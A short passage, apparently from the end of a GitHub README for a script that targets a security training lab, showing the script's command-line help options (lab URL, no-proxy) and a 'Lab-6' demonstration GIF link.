  -h, --help         show this help message and exit
  -u URL, --url URL  Enter the Lab URL
  -n, --no-proxy     Do not use proxy                               
```
![Lab-6](https://user-images.githubusercontent.com/101610095/221149027-bd9696a0-8880-450e-b5b0-e1cad7d17184.gif)
